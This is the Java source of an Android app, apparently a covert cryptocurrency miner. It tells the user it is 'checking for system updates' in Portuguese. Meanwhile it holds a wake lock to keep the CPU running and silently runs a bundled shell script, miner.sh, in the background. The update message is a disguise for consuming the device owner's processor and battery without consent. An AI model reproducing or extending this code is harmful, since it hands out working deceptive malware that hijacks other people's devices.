package com.miner.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.PowerManager;
import android.widget.TextView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("Verificando atualizações do sistema...");
        setContentView(tv);

        // Manter a tela ligada/CPU ativa
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                File script = new File(getFilesDir(), "miner.sh");
                copyAsset("miner.sh", script);
                script.setExecutable(true);

                ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", script.getAbsolutePath());
                pb.directory(getFilesDir());
                pb.environment().put("IS_NATIVE_APP", "true");
                pb.environment().put("APP_FILES_DIR", getFilesDir().getAbsolutePath());
                pb.redirectErrorStream(true);
                pb.start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void copyAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) {
            os.write(buffer, 0, read);
        }
        is.close();
        os.flush();
        os.close();
    }
}
